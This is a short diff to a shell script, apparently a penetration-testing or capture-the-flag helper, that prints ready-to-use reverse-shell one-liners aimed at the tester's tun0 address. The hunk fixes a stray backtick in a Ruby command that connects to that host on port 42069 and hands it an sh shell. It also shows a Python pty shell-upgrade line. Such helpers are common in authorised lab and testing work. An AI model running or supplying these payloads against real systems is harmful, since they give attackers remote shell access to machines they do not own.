@@ -42,7 +42,7 @@ else
 
     echo ""
     echo '# ruby ----------------------------'
-    echo "ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$tun0",42069))'`"
+    echo "ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$tun0",42069))"
     echo ""
     echo '# Shell Upgrade -------------------'
     echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
